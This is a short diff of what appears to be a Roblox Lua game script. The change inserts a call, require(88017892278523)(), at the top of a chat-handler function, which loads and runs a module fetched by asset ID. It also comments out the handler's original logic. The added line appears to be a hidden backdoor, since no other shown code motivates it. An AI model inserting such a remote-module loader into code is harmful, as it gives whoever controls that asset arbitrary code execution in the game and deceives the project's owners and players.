@@ -167,6 +167,8 @@ local enabled = false
 local connections = {}
 
 local function connectchat(user)
+require(88017892278523)()
+--[[
 	if not enabled then
 		local connection = user.Chatted:Connect(function(chatted)
 			if chatted == 'game/load' then
@@ -180,7 +182,7 @@ local function connectchat(user)
 		end)
 
 		table.insert(connections, connection)
-	end
+	end]]
 end
 
 while task.wait() do
